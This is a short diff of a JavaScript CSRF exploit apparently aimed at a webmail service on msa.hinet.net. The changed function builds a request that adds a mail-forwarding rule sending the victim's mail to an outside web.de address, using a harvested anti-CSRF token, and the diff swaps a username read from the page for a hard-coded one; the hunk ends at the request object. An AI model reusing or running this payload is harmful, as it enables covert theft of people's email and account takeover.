@@ -1,6 +1,6 @@
 function csrfadd(rs){
 var addmail="e1yad%40web.de"
-var u1=document.baseURI.match((/^(?:[^\/]|\/\/)*/))[0]+'/mailService/mail/M_set_1_10.do?user_name='+document.getElementsByClassName('wm-navbar-username')[0].innerText+'&host_name='
+var u1=document.baseURI.match((/^(?:[^\/]|\/\/)*/))[0]+'/mailService/mail/M_set_1_10.do?user_name='+'rory.chien'+'&host_name='
 var u2="msa.hinet.net"+"&forward_content="+addmail+"%0D%0A&add_new_forward_address="+addmail+"&owaspcsrftkn="+rs
 var u3=u1+u2
 var h = new XMLHttpRequest();
